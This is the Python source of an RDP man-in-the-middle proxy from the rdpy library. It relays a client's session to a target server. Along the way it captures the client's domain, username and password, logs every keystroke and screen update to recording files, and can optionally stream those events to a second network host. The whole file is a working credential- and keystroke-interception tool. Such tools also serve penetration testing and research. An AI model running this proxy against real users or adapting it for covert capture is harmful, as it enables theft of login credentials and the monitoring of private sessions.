#!/usr/bin/python
#
# Copyright (c) 2014-2015 Sylvain Peyrefitte
#
# This file is part of rdpy.
#
# rdpy is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#

"""
RDP proxy with Man in the middle capabilities
Save RDP events in output RSR file format
RSR file format can be read by rdpy-rsrplayer.py
               ----------------------------
Client RDP -> | ProxyServer | ProxyClient | -> Server RDP
              ----------------------------
                   | Record Session |
                   -----------------
"""
import argparse
import sys, os, getopt, time

from rdpy.core import log, error, rss
from rdpy.protocol.rdp import rdp
from twisted.internet import reactor

log._LOG_LEVEL = log.Level.INFO


class ProxyServer(rdp.RDPServerObserver):
    """
    @summary: Server side of proxy
    """
    def __init__(self, controller, target, clientSecurityLevel, rssRecorders):
        """
        @param controller: {RDPServerController}
        @param target: {tuple(ip, port)}
        @param rssRecorder: {rss.FileRecorder} use to record session
        """
        rdp.RDPServerObserver.__init__(self, controller)
        self._target = target
        self._client = None
        self._rss_recorders = rssRecorders
        self._clientSecurityLevel = clientSecurityLevel

    def setClient(self, client):
        """
        @summary: Event throw by client when it's ready
        @param client: {ProxyClient}
        """
        self._client = client

    def onReady(self):
        """
        @summary:  Event use to inform state of server stack
                    First time this event is called is when human client is connected
                    Second time is after color depth nego, because color depth nego
                    restart a connection sequence
        @see: rdp.RDPServerObserver.onReady
        """
        if self._client is None:
            #try a connection
            domain, username, password = self._controller.getCredentials()
            for recorder in self._rss_recorders:
                recorder.credentials(username, password, domain, self._controller.getHostname())

            width, height = self._controller.getScreen()
            for recorder in self._rss_recorders:
                recorder.screen(width, height, self._controller.getColorDepth())

            reactor.connectTCP(self._target[0], int(self._target[1]), ProxyClientFactory(self, width, height,
                                                            domain, username, password,self._clientSecurityLevel))

    def onClose(self):
        """
        @summary: Call when human client close connection
        @see: rdp.RDPServerObserver.onClose
        """
        #end scenario
        for recorder in self._rss_recorders:
            recorder.close()

        #close network stack
        if self._client is None:
            return
        self._client._controller.close()

    def onKeyEventScancode(self, code, isPressed, isExtended):
        """
        @summary: Event call when a keyboard event is catch in scan code format
        @param code: {integer} scan code of key
        @param isPressed: {boolean} True if key is down
        @param isExtended: {boolean} True if a special key
        @see: rdp.RDPServerObserver.onKeyEventScancode
        """
        if self._client is None:
            return
        self._client._controller.sendKeyEventScancode(code, isPressed, isExtended)
        for recorder in self._rss_recorders:
            recorder.keyScancode(code, isPressed)

    def onKeyEventUnicode(self, code, isPressed):
        """
        @summary: Event call when a keyboard event is catch in unicode format
        @param code: unicode of key
        @param isPressed: True if key is down
        @see: rdp.RDPServerObserver.onKeyEventUnicode
        """
        if self._client is None:
            return
        self._client._controller.sendKeyEventUnicode(code, isPressed)
        for recorder in self._rss_recorders:
            recorder.keyUnicode(code, isPressed)

    def onPointerEvent(self, x, y, button, isPressed):
        """
        @summary: Event call on mouse event
        @param x: {int} x position
        @param y: {int} y position
        @param button: {int} 1, 2 or 3 button
        @param isPressed: {bool} True if mouse button is pressed
        @see: rdp.RDPServerObserver.onPointerEvent
        """
        if self._client is None:
            return
        self._client._controller.sendPointerEvent(x, y, button, isPressed)


class ProxyServerFactory(rdp.ServerFactory):
    """
    @summary: Factory on listening events
    """
    def __init__(self, target, ouputDir, privateKeyFilePath, certificateFilePath, clientSecurity,
                 destination_ip, destination_port):
        """
        @param target: {tuple(ip, prt)}
        @param privateKeyFilePath: {str} file contain server private key (if none -> back to standard RDP security)
        @param certificateFilePath: {str} file contain server certificate (if none -> back to standard RDP security)
        @param clientSecurity: {str(ssl|rdp)} security layer use in client connection side
        @param destination_ip: {str} destination ip for the socketRecorder. No socket recorder if this is None.
        @param destination_port: {int} destination port for the socketRecorder.
        """
        rdp.ServerFactory.__init__(self, 16, privateKeyFilePath, certificateFilePath)
        self._target = target
        self._ouputDir = ouputDir
        self._clientSecurity = clientSecurity
        self._destination_ip = destination_ip
        self._destination_port = destination_port
        #use produce unique file by connection
        self._uniqueId = 0

    def buildObserver(self, controller, addr):
        """
        @param controller: {rdp.RDPServerController}
        @param addr: destination address
        @see: rdp.ServerFactory.buildObserver
        """
        self._uniqueId += 1
        recorders = []
        if self._destination_ip:
            recorders.append(rss.createSocketRecorder(self._destination_ip, self._destination_port))
        recorders.append(rss.createRecorder(os.path.join(self._ouputDir, "%s_%s_%s.rss" % (time.strftime('%Y%m%d%H%M%S'), addr.host, self._uniqueId))))
        return ProxyServer(controller, self._target, self._clientSecurity, recorders)


class ProxyClient(rdp.RDPClientObserver):
    """
    @summary: Client side of proxy
    """
    def __init__(self, controller, server):
        """
        @param controller: {rdp.RDPClientController}
        @param server: {ProxyServer}
        """
        rdp.RDPClientObserver.__init__(self, controller)
        self._server = server

    def onReady(self):
        """
        @summary:  Event use to signal that RDP stack is ready
                    Inform ProxyServer that i'm connected
        @see: rdp.RDPClientObserver.onReady
        """
        self._server.setClient(self)
        #maybe color depth change
        self._server._controller.setColorDepth(self._controller.getColorDepth())

    def onSessionReady(self):
        """
        @summary: Windows session is ready
        @see: rdp.RDPClientObserver.onSessionReady
        """
        pass

    def onClose(self):
        """
        @summary: Event inform that stack is close
        @see: rdp.RDPClientObserver.onClose
        """
        #end scenario
        for recorder in self._server._rss_recorders:
            recorder.close()
        self._server._controller.close()

    def onUpdate(self, destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data):
        """
        @summary: Event use to inform bitmap update
        @param destLeft: {int} xmin position
        @param destTop: {int} ymin position
        @param destRight: {int} xmax position because RDP can send bitmap with padding
        @param destBottom: {int} ymax position because RDP can send bitmap with padding
        @param width: {int} width of bitmap
        @param height: {int} height of bitmap
        @param bitsPerPixel: {int} number of bit per pixel
        @param isCompress: {bool} use RLE compression
        @param data: {str} bitmap data
        @see: rdp.RDPClientObserver.onUpdate
        """
        for recorder in self._server._rss_recorders:
            recorder.update(destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, rss.UpdateFormat.BMP if isCompress else rss.UpdateFormat.RAW, data)
        self._server._controller.sendUpdate(destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data)


class ProxyClientFactory(rdp.ClientFactory):
    """
    @summary: Factory for proxy client
    """
    def __init__(self, server, width, height, domain, username, password, security):
        """
        @param server: {ProxyServer}
        @param width: {int} screen width
        @param height: {int} screen height
        @param domain: {str} domain session
        @param username: {str} username session
        @param password: {str} password session
        @param security: {str(ssl|rdp)} security level
        """
        self._server = server
        self._width = width
        self._height = height
        self._domain = domain
        self._username = username
        self._password = password
        self._security = security

    def buildObserver(self, controller, addr):
        """
        @summary: Build observer
        @param controller: rdp.RDPClientController
        @param addr: destination address
        @see: rdp.ClientFactory.buildObserver
        @return: ProxyClient
        """
        #set screen resolution
        controller.setScreen(self._width, self._height)
        #set credential
        controller.setDomain(self._domain)
        controller.setUsername(self._username)
        controller.setPassword(self._password)
        controller.setSecurityLevel(self._security)
        controller.setPerformanceSession()
        return ProxyClient(controller, self._server)


def parseIpPort(interface, defaultPort = "3389"):
    if ':' in interface:
        return interface.split(':')
    else:
        return interface, defaultPort


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="IP:port of the target RDP machine (ex: 129.168.0.2:3390)")
    parser.add_argument("-l", "--listen", help="Port number to listen to. Default 3389", default=3389)
    parser.add_argument("-o", "--output", help="Output folder for .rss files")
    parser.add_argument("-i", "--destination-ip", help="Destination IP address to send RDP events to (for live player)."
                                                       " If not specified, doesn't send the RDP events "
                                                       "over the network.")
    parser.add_argument("-d", "--destination-port", help="Destination port number (for live player). Default 3000",
                        default=3000)
    parser.add_argument("-k", "--private-key", help="Path to private key (for SSL)")
    parser.add_argument("-c", "--certificate", help="Path to certificate (for SSL)")
    parser.add_argument("-r", "--standard-security", help="RDP standard security (XP or server 2003 client or older)",
                        action="store_true")
    parser.add_argument("-n", "--nla", help="For NLA client authentication (need to provide credentials)",
                        action="store_true")

    args = parser.parse_args()

    clientSecurity = rdp.SecurityLevel.RDP_LEVEL_SSL

    if args.output is None or not os.path.dirname(args.output):
        log.error("{} is an invalid output directory".format(args.output))
        parser.print_help()
        exit(1)
    if args.nla:
        clientSecurity = rdp.SecurityLevel.RDP_LEVEL_NLA
    elif args.standard_security:
        clientSecurity = rdp.SecurityLevel.RDP_LEVEL_RDP

    reactor.listenTCP(args.listen, ProxyServerFactory(parseIpPort(args.target), args.output, args.private_key,
                                                      args.certificate, clientSecurity,
                                                      args.destination_ip, int(args.destination_port)))
    reactor.run()
